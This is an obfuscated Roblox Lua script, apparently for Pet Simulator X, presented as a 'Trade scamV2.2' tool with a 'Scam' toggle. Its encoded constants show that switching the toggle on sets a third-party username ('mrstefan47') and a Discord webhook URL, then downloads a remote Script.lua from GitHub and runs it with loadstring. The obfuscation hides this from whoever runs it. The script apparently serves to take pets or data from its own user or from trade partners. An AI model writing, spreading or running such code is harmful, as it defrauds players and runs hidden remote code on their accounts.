--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.1.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16,...)local v17=1;local v18;v15=v4(v3(v15,5),"..",function(v29)if (v1(v29,2)==79) then local v61=0;while true do if (v61==0) then v18=v0(v3(v29,1,1));return "";end end else local v62=v2(v0(v29,16));if v18 then local v69=0;local v70;while true do if (v69==1) then return v70;end if (v69==0) then v70=v5(v62,v18);v18=nil;v69=1;end end else return v62;end end end);local function v19(v30,v31,v32)if v32 then local v63=(v30/(((2 -0) + 0)^(v31-(1 -0))))%((276 -(180 + 94))^(((v32-1) -(v31-(1 + 0))) + (1279 -(468 + (1603 -793)))));return v63-(v63%1);else local v64=597 -(27 + 185 + 385);local v65;while true do if (v64==(796 -(156 + 640))) then v65=(5 -(446 -(10 + 433)))^(v31-(1 + 0));return (((v30%(v65 + v65))>=v65) and ((1602 -(640 + 874)) -(69 + 18))) or (0 -0);end end end end local function v20()local v37=v1(v15,v17,v17);v17=v17 + 1;return v37;end local function v21()local v38,v39=v1(v15,v17,v17 + 2);v17=v17 + (6 -4);return (v39 * 256) + v38;end local function v22()local v40,v41,v42,v43=v1(v15,v17,v17 + 1 + 1 + 1);v17=v17 + (9 -5);return (v43 * ((150395554 -92849137) -(40769238 -(14 + 23)))) + (v42 * 65536) + (v41 * (295 -(32 + 7))) + v40;end local function v23()local v44=v22();local v45=v22();return (( -(3 -1) * v19(v45,32)) + (117 -(111 + (1525 -(65 + 1455))))) * ((2 + 0)^(v19(v45,102 -81,31) -(763 + 260))) * ((((v19(v45,551 -(503 + 22 + 25),48 -28) * ((1 + 1 + 0)^(63 -31))) + v44)/(2^(2 + (1392 -(1028 + 314))))) + 1 + 0);end local function v24(v33)local v46=0 + 0;local v47;local v48;while true do if (v46==(1 + 0)) then v47=v3(v15,v17,(v17 + v33) -((459 -(24 + 434)) + 0));v17=v17 + v33;v46=3 -1;end if (v46==(971 -(510 + 461))) then v47=nil;if  not v33 then v33=v22();if (v33==(0 -0)) then return "";end end v46=1 -0;end if (v46==(2 + 0)) then v48={};for v71=2 -1, #v47 do v48[v71]=v2(v1(v3(v47,v71,v71)));end v46=9 -6;end if ((1927 -(174 + 1750))==v46) then return v6(v48);end end end local v25=v22;local function v26(...)return {...},v11("#",...);end local function v27()local v49=0;local v50;local v51;local v52;local v53;local v54;local v55;local v56;while true do if (v49==1) then v52=nil;v53=nil;v49=5 -3;end if (v49~=0) then else v50=0 + 0;v51=nil;v49=1;end if (2==v49) then v54=nil;v55=nil;v49=3;end if (v49~=(3 -0)) then else v56=nil;while true do local v73=1918 -(1180 + 738);local v74;while true do if ((0 + 0)==v73) then v74=1920 -(1747 + 173);while true do if (v74==1) then if (v50~=(1910 -(629 + 1280))) then else local v96=0;local v97;while true do if (v96~=0) then else v97=0;while true do if (v97~=(781 -(100 + 680))) then else local v115=0;while true do if (v115==(2 -1)) then v97=2;break;end if (v115==0) then for v120=1651 -(7 + 1643),v55 do local v121=0;local v122;local v123;local v124;local v125;while true do if (v121==1) then v124=nil;v125=nil;v121=2;end if (v121==(1243 -(148 + 1095))) then v122=0;v123=nil;v121=1;end if (v121~=(6 -4)) then else while true do if (v122==1) then v125=nil;while true do if (v123==(1 + 0)) then if (v124==(660 -(595 + 64))) then v125=v20()~=(1537 -(1072 + 465));elseif (v124==(1 + 1)) then v125=v23();elseif (v124==(4 -1)) then v125=v24();end v56[v120]=v125;break;end if (v123==(0 -0)) then local v185=110 -(41 + 69);local v186;while true do if (0~=v185) then else v186=0 -0;while true do if (v186~=1) then else v123=1;break;end if (v186==(87 -(38 + 49))) then local v214=0 + 0;while true do if (v214==1) then v186=1;break;end if (v214~=(0 + 0)) then else v124=v20();v125=nil;v214=2 -1;end end end end break;end end end end break;end if (0==v122) then local v177=636 -(517 + 119);local v178;while true do if (v177==(1397 -(133 + 1264))) then v178=0;while true do if (v178==0) then local v205=0 + 0;while true do if (v205==0) then v123=0;v124=nil;v205=1;end if (1~=v205) then else v178=1 + 0;break;end end end if (v178==(1 + 0)) then v122=1;break;end end break;end end end end break;end end end v54[3]=v20();v115=1366 -(652 + 713);end end end if (v97==0) then local v116=0;while true do if (v116==1) then v97=1;break;end if (v116==0) then v55=v22();v56={};v116=1501 -(634 + 866);end end end if ((2 -0)==v97) then v50=2;break;end end break;end end end break;end if (v74==0) then if (v50==(518 -(204 + 314))) then local v98=0;while true do if (v98==2) then v50=29 -(7 + 21);break;end if (v98==(0 -0)) then local v104=0 + 0;while true do if (v104==1) then v98=620 -(358 + 261);break;end if (v104~=(0 + 0)) then else v51={};v52={};v104=1 + 0;end end end if (1~=v98) then else local v105=0;while true do if (v105~=1) then else v98=1602 -(1564 + 36);break;end if (v105~=(845 -(14 + 831))) then else v53={};v54={v51,v52,nil,v53};v105=1174 -(182 + 991);end end end end end if (v50==2) then local v99=0;while true do if (v99~=1) then else for v106=1 -0,v22() do v53[v106]=v22();end return v54;end if (v99~=0) then else for v108=2 -1,v22() do local v109=0;local v110;local v111;while true do if ((1 + 0)~=v109) then else while true do if (v110==(0 -0)) then v111=v20();if (v19(v111,1,1)==(119 -(24 + 95))) then local v126=173 -(130 + 43);local v127;local v128;local v129;while true do if ((1 -0)==v126) then local v146=0;while true do if (1~=v146) then else v126=2;break;end if (v146~=0) then else v129={v21(),v21(),nil,nil};if (v127==(0 -0)) then local v194=85 -(13 + 72);local v195;while true do if (v194==(0 + 0)) then v195=445 -(373 + 72);while true do if (v195==0) then v129[202 -(155 + 44)]=v21();v129[5 -1]=v21();break;end end break;end end elseif (v127==(1405 -(1160 + 244))) then v129[3 -0]=v22();elseif (v127==(1469 -(1388 + 79))) then v129[3]=v22() -((2 -0)^(8 + 8));elseif (v127~=3) then else local v221=0;local v222;while true do if (v221~=0) then else v222=0 -0;while true do if (0==v222) then v129[3 + 0]=v22() -((1267 -(807 + 458))^(8 + 8));v129[556 -(551 + 1)]=v21();break;end end break;end end end v146=1 + 0;end end end if (v126==(7 -5)) then local v147=0;while true do if (1==v147) then v126=3;break;end if (v147==0) then if (v19(v128,1,2 -1)~=(1 -0)) then else v129[4 -2]=v56[v129[2]];end if (v19(v128,2,1741 -(1734 + 5))~=(1 + 0)) then else v129[3]=v56[v129[3]];end v147=1 -0;end end end if ((407 -(11 + 393))~=v126) then else if (v19(v128,1130 -(244 + 883),3)~=1) then else v129[6 -2]=v56[v129[4]];end v51[v108]=v129;break;end if (v126==(0 -0)) then local v149=0;while true do if (v149~=(0 + 0)) then else v127=v19(v111,1003 -(916 + 85),3);v128=v19(v111,1 + 3,1 + 5);v149=1;end if (v149~=(1 -0)) then else v126=1;break;end end end end end break;end end break;end if ((0 + 0)==v109) then v110=0;v111=nil;v109=1 + 0;end end end for v112=1 + 0,v22() do v52[v112-(1 + 0)]=v27();end v99=1;end end end v74=1;end end break;end end end break;end end end local function v28(v34,v35,v36)local v57=0;local v58;local v59;local v60;while true do if (v57==1) then v60=v34[3];return function(...)local v75=0;local v76;local v77;local v78;local v79;local v80;while true do if (v75==2) then v80=nil;v80=function()local v81=v58;local v82=v59;local v83=v60;local v84=v26;local v85={};local v86={};local v87={};for v93=0 + 0,v79 do if (((1973 -(768 + 181))<(3682 + 336)) and (v93>=v83)) then v85[v93-v83]=v78[v93 + (1551 -(775 + 775))];else v87[v93]=v78[v93 + (91 -((67 -48) + 71))];end end local v88=(v79-v83) + 1 + 0;local v89;local v90;while true do local v94=0 -0;local v95;while true do if ((((4184 + 2336) -5020)==(1710 -(66 + 144))) and (v94==0)) then v95=0 + 0 + (0 -0);while true do if ((v95==(1 -0)) or ((4394 -(497 + 511))==2936)) then if ((v90<=(9 + 0)) or ((679 + 64)>=(5374 -(1528 + 122)))) then if ((v90<=(4 + 0)) or ((980 -366)>=(2332 + 884))) then if (((756 + 885)<=(229 + 2222)) and (v90<=(1 + 0))) then if ((398==(999 -(584 + 17))) and (v90==(0 + 0))) then local v130=(1378 -(42 + 1336)) + 0;local v131;local v132;local v133;while true do if (((3505 -2432)==(4791 -3718)) and (v130==(1851 -(813 + 1038)))) then v131=0 -0;v132=nil;v130=2 -1;end if ((v130==(1768 -(591 + 1176))) or (((9347 -7025) + 557)==(14323 -9749))) then v133=nil;while true do if (((10516 -6675)>=((2644 + 2642) -3411)) and (v131==((3384 -2585) -(570 + 229)))) then v132=v89[4 -2];v133=v87[v89[677 -(255 + 419)]];v131=1 + 0;end if ((((2 -1) + 0)==v131) or ((467 -295)>=(3215 -(265 + 42)))) then v87[v132 + (520 -(197 + 322))]=v133;v87[v132]=v133[v89[1 + (1936 -(284 + 1649))]];break;end end break;end end elseif (((16292 -12855)<=(1311 + 2465)) and (v89[5 -3]==v87[v89[2 + 2]])) then v76=v76 + (4 -3);else v76=v89[1308 -(562 + 743)];end elseif ((v90<=(1 + 1)) or ((431 + 84)>(16788 -12249))) then v87[v89[2]]=v89[7 -4]~=((183 -(5 + 178)) + 0);elseif (((275 -158)<=(120 + 948)) and (v90==((2068 -(1734 + 259)) -(14 + 41 + 17)))) then for v179=v89[4 -2],v89[2 + 1] do v87[v179]=nil;end else local v151=0 + 0;local v152;local v153;while true do if ((v151==(1765 -(337 + 1428))) or ((4485 -(11 + 492))==(4700 -(204 + 406)))) then v152=1753 -(1692 + 61);v153=nil;v151=1 + 0;end if (((10153 -6091)>=(373 -112)) and (v151==(1 + 0))) then while true do if (((2416 -1329)<(5931 -2480)) and (v152==(0 + 0))) then v153=v89[2 + 0];v87[v153]=v87[v153](v12(v87,v153 + ((1 + 1) -1),v89[3]));break;end end break;end end end elseif ((((8156 -(154 + 527)) -(12009 -7458))==(4035 -((2368 -1319) + 62))) and (v90<=(22 -16))) then if ((v90==((7 + 3) -5)) or ((8558 -(1988 + 2379))==(675 + 259))) then v87[v89[6 -4]]=v87[v89[3]][v89[3 + 1]];else local v137=(1869 -(444 + 296)) -((1653 -1127) + 603);local v138;local v139;while true do if ((v137==(0 + 0)) or ((1081 -(55 + 103))==(747 + 2772))) then v138=734 -(258 + 476);v139=nil;v137=2 -1;end if (((806 -(470 + (891 -556)))==v137) or ((1672 -407)==3710)) then while true do if ((((40020 -31664) -5098)==(4690 -(616 + 816))) and (v138==(237 -(52 + 185)))) then v139=v89[2 -(1514 -(281 + 1233))];v87[v139]=v87[v139](v12(v87,v139 + (292 -(218 + 73)),v77));break;end end break;end end end elseif ((v90<=(14 -7)) or ((9685 -6186)>=(5260 -(88 + 358 + 77)))) then do return;end elseif ((v90>((1400 -(356 + 156)) -(210 + 670))) or ((19276 -15349)==(2207 -(1015 + 145)))) then v87[v89[1622 -(1574 + (176 -130))]]();else local v154=1214 -(1037 + 177);local v155;local v156;while true do if ((v154==(0 + 0)) or ((225 -126)>=(7648 -4785))) then v155=807 -(506 + 301);v156=nil;v154=1 + 0;end if ((v154==(1616 -(1557 + 58))) or (1373>=(3493 -(240 + 411)))) then while true do if ((v155==(0 + 0)) or ((3791 -(74 + 27))<=(2781 -(53 + 673)))) then v156=v89[5 -3];v87[v156](v12(v87,v156 + 1 + 0 + 0,v89[1 + 2]));break;end end break;end end end elseif ((v90<=(20 -6)) or ((4820 -(1445 + 357))==(3702 -(869 + 620)))) then if ((v90<=(43 -32)) or ((4276 + 182)<(5 + 204))) then if ((((5627 + 3543) -6542)==((4319 -3298) + 1607)) and (v90>(292 -(211 + 71)))) then v87[v89[7 -5]]=v28(v82[v89[(532 -(263 + 261)) -5]],nil,v36);elseif (v87[v89[(1707 -(1694 + 11)) + 0]] or (((337 -227) -78)>=(2464 -(490 + (2056 -(648 + 309)))))) then v76=v76 + 1 + 0;else v76=v89[3 -0];end elseif ((v90<=(20 -8)) or ((3057 -1450)>(4015 -2301))) then v87[v89[2 + 0]]=v36[v89[4 -1]];elseif (((2395 -(121 + 789))<=(7057 -2838)) and (v90==(1678 -(1158 + 507)))) then v87[v89[1390 -(770 + 618)]]=v89[3 + 0];else v36[v89[2 + 1]]=v87[v89[1 + 1]];end elseif ((v90<=((54 -38) + 1)) or ((2006 -(489 + 599))==1130)) then if (((33 + 2689)>=((217 + 2911) -(382 + 1240))) and (v90<=((288 -67) -(189 + 17)))) then v87[v89[2 + 0]]=v87[v89[1 + 2]];elseif ((v90>(59 -43)) or (((181 -110) + 1066)>=(5711 -(620 + 480)))) then local v162=1760 -(304 + 1317 + 139);local v163;local v164;local v165;while true do if ((v162==(0 + 0)) or ((140 -104)>=4392)) then v163=1653 -(1349 + 304);v164=nil;v162=(1 + 0) -(0 -0);end if (((2277 -(533 + (1252 -(848 + 249))))<(2124 + 1991)) and (v162==(1395 -(1067 + 327)))) then v165=nil;while true do if ((v163==(0 -0)) or ((1404 + 2600)<=(1579 -(1236 + 53)))) then local v203=0 + 0;while true do if ((v203==(303 -(286 + 16))) or ((4897 -(21 + 28))<(1053 + 79))) then v163=2 -1;break;end if ((v203==(1005 -(718 + 287))) or ((6166 -2985)<=(1861 + 781))) then v164=0 + 0;v165=nil;v203=1248 -(60 + 1187);end end end if ((v163==(3 -2)) or ((472 + 768)<=(128 -40))) then while true do if (((2143 + 33)<=((1010 + 9232) -6982)) and (v164==(0 -0))) then v165=v89[5 -3];v87[v165]=v87[v165]();break;end end break;end end break;end end else local v166=123 -(115 + 8);local v167;local v168;local v169;while true do if (((8793 -5320)==(4226 -(577 + 176))) and (v166==(1903 -(80 + 1823)))) then v167=0 -0;v168=nil;v166=1 + 0;end if (((2117 -(1139 + 480))<=(903 + 25)) and (((349 -(136 + 209)) -3)==v166)) then v169=nil;while true do if ((198<=(3642 -(503 + 585))) and (v167==(723 -(96 + 626)))) then while true do if ((0==v168) or ((3289 + 1215)<=(2910 -2280))) then v169=v89[662 -(465 + 195)];v87[v169](v87[v169 + (508 -(486 + (89 -68)))]);break;end end break;end if (((4136 -(792 + 312))>(3703 -988)) and (v167==(0 -0))) then v168=0 + 0;v169=nil;v167=804 -(144 + 659);end end break;end end end elseif ((v90<=(26 -8)) or ((3459 -(728 + 669))>=((1179 -(202 + 11)) + 1476))) then v76=v89[769 -(745 + 21)];elseif ((v90==(27 -(39 -31))) or ((4792 -2474)<(3123 -(131 + 34 + 1379)))) then local v170=0 -0;local v171;local v172;local v173;local v174;local v175;local v176;while true do if ((v170==(527 -(255 + 270))) or ((3353 + 9)>(2217 + 1652))) then v175=nil;v176=nil;v170=713 -(52 + 658);end if (((1300 -(175 + 797))<(3804 -(885 + 40))) and ((1 + 0)==v170)) then v173=nil;v174=nil;v170=7 -5;end if (((5025 -(191 + 405))>(376 + 40)) and ((3 + 0)==v170)) then while true do if ((v171==(1 + 1)) or ((3276 -986)==(1800 + 2225))) then v176=nil;while true do if (((787 -(663 + 46))<=(14235 -10509)) and (v172==(3 -(1316 -(974 + 341))))) then for v215=v173,v77 do local v216=0 -0;local v217;local v218;while true do if (((2616 -(1567 + 111))<(936 + 973)) and ((0 + 0)==v216)) then v217=347 -(106 + 241);v218=nil;v216=1 + 0;end if (((4574 -(701 + 237))>=(3391 -(728 + (606 -410)))) and ((1 + 0)==v216)) then while true do if ((v217==(320 -(129 + 191))) or ((3521 -1307)>(18318 -13950))) then v218=1392 -(539 + 853);while true do if ((((0 + 0) -0)==v218) or (((3727 + 2181) -(999 + 249))==(6061 -(1522 + (83 -60))))) then v176=v176 + 1 + 0;v87[v215]=v174[v176];break;end end break;end end break;end end end break;end if (((5362 -(165 + 565))>(539 + 94)) and ((212 -(26 + 26 + 159))==v172)) then local v211=0 + 0;local v212;while true do if (((2185 -(554 + 6))<=(14464 -10135)) and (v211==(0 -0))) then v212=0 + (807 -(661 + 146));while true do if ((v212==1) or ((18170 -14377)<(6266 -5002))) then v172=2 + 0;break;end if ((v212==(0 -0)) or ((2365 -1017)>(6822 -((1567 -771) + 1058)))) then v77=(v175 + v173) -1;v176=(0 -0) -0;v212=1 + (90 -(8 + 82));end end break;end end end if ((1883<=((5212 -2599) + 806)) and (v172==(0 + 0))) then local v213=1463 -(1321 + 89 + 53);while true do if ((v213==((4 -3) -0)) or (((11173 -8014) -((784 -(115 + 1)) + 91))<(747 -216))) then v172=(594 -(573 + 18)) -2;break;end if ((v213==(240 -(82 + 158))) or ((5433 -(80 + (2783 -2075)))==(6419 -(1604 + 226)))) then v173=v89[2 + 0];v174,v175=v84(v87[v173](v12(v87,v173 + ((2 -0) -1),v89[1 + 2])));v213=3 -2;end end end end break;end if ((v171==(705 -(610 + 4 + 90))) or ((1210 + 194)>(5023 -2858))) then local v204=850 -((1910 -(1400 + 25)) + 365);while true do if (((1 + 2914)>=(44 + 158)) and (((0 -0) -0)==v204)) then v174=nil;v175=nil;v204=1 + 0;end if ((v204==(1 -0)) or ((1883 + 470)==((5871 -(1725 + 95)) -((62 -19) + 500)))) then v171=1844 -(1158 + 684);break;end end end if (((1650 + 1406)==(7356 -(5323 -(445 + 578)))) and (v171==((0 -0) -0))) then v172=0 + 0;v173=nil;v171=(1693 -(643 + 1049)) + 0;end end break;end if (((4233 -(114 + 702))==(3554 -(7 + 130))) and (v170==((1346 -(999 + 168)) -(156 + 19 + 4)))) then v171=1524 -((1397 -(519 + 53)) + 699);v172=nil;v170=(930 + 401) -(1024 + 306);end end elseif (((5857 -3448)>(2190 -(221 + 691))) and (v87[v89[2 + 0]]==v89[2 + 2])) then v76=v76 + 1 + 0;else v76=v89[2 + 1];end v76=v76 + 1 + (1800 -(1002 + 798));break;end if (((1123 + 459)<(4365 -1978)) and (v95==0)) then local v114=764 -(130 + 634);while true do if (((3187 -1936)==(814 + 437)) and (v114==0)) then v89=v81[v76];v90=v89[1132 -(617 + 514)];v114=1;end if ((v114==(1140 -(317 + 733 + 89))) or ((1568 -(6 + 349 + 316))>=(9481 -6635))) then v95=1 + 0;break;end end end end break;end end end end;v75=3;end if (v75==0) then v76=1;v77= -1;v75=1;end if (v75==1) then v78={...};v79=v11("#",...) -1;v75=2;end if (v75==3) then A,B=v26(v10(v80));if  not A[1] then local v91=0;local v92;while true do if (0==v91) then v92=v34[4][v76] or "?";error("Script error at ["   .. v92   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end break;end end end;end if (0==v57) then v58=v34[1];v59=v34[2];v57=1;end end end return v28(v27(),{},v16)(...);end v14("LOL!113O00028O00026O00F03F027O004003093O004E6577546F2O676C65030A3O005472616465205363616D031B3O0050757420506574206120547261646520616E64206F6E207468697303063O004E657754616203053O005472616465030A3O004E657753656374696F6E03043O005363616D030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403483O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F7848657074632F4B61766F2D55492D4C6962726172792F6D61696E2F736F757263652E6C756103093O004372656174654C6962030E3O005472616465207363616D56322E3203093O004461726B5468656D65003D3O00120D3O00014O0003000100053O000E010001000700013O0004123O0007000100120D000100014O0003000200023O00120D3O00023O000E010003003700013O0004123O003700012O0003000500053O00261400010012000100030004123O0012000100202O00060005000400120D000800053O00120D000900063O00020B000A6O00080006000A00010004123O003C000100261400010025000100020004123O0025000100120D000600013O00261400060019000100020004123O0019000100120D000100033O0004123O00250001000E0100010015000100060004123O0015000100202O00070003000700120D000900084O00040007000900022O000F000400073O00202O00070004000900120D0009000A4O00040007000900022O000F000500073O00120D000600023O0004123O001500010026140001000A000100010004123O000A000100120C0006000B3O00120C0007000C3O00202O00070007000D00120D0009000E4O0013000700094O000600063O00022O00110006000100022O000F000200063O00200500060002000F00120D000700103O00120D000800114O00040006000800022O000F000300063O00120D000100023O0004123O000A00010004123O003C00010026143O0002000100020004123O000200012O0003000300043O00120D3O00033O0004123O000200012O00073O00013O00013O000C3O00028O00026O00F03F03083O00557365724E616D65030A3O006D7273746566616E343703073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130363036352O3137343733363432393135362F79734F4C4F356C76446844572O454D42355246514574444849346F4433786244426C624178706B754352635961532O516E757A3430314672645F45716A79486E5F2O665F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403403O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F5363726970742E6C756103053O007072696E74030A3O00546F2O676C65204F2O6601293O00060A3O002500013O0004123O0025000100120D000100014O0003000200023O00261400010004000100010004123O0004000100120D000200013O00261400020016000100010004123O0016000100120D000300013O0026140003000E000100020004123O000E000100120D000200023O0004123O001600010026140003000A000100010004123O000A000100120D000400043O00120E000400033O00120D000400063O00120E000400053O00120D000300023O0004123O000A000100261400020007000100020004123O0007000100120C000300073O00120C000400083O00202O00040004000900120D0006000A4O0002000700014O0013000400074O000600033O00022O00090003000100010004123O002800010004123O000700010004123O002800010004123O000400010004123O0028000100120C0001000B3O00120D0002000C4O00100001000200012O00073O00017O00293O00133O00133O00143O00153O00173O00173O00183O001A3O001A3O001B3O001D3O001D3O001E3O001F3O00213O00213O00223O00223O00233O00233O00243O00253O00283O00283O00293O00293O00293O00293O00293O00293O00293O00293O002A3O002B3O002D3O002E3O002F3O00313O00313O00313O00333O003D3O00023O00033O00093O00093O000A3O000B3O000C3O000E3O000E3O000F3O00113O00113O00123O00123O00123O00333O00123O00343O00363O00363O00373O00393O00393O003A3O003B3O003D3O003D3O003E3O003E3O003E3O003E3O003F3O003F3O003F3O003F3O00403O00413O00443O00443O00453O00453O00453O00453O00453O00453O00453O00453O00463O00463O00463O00463O00463O00473O00483O004A3O004C3O004C3O004D3O004F3O00503O00523O00",v8(),...);end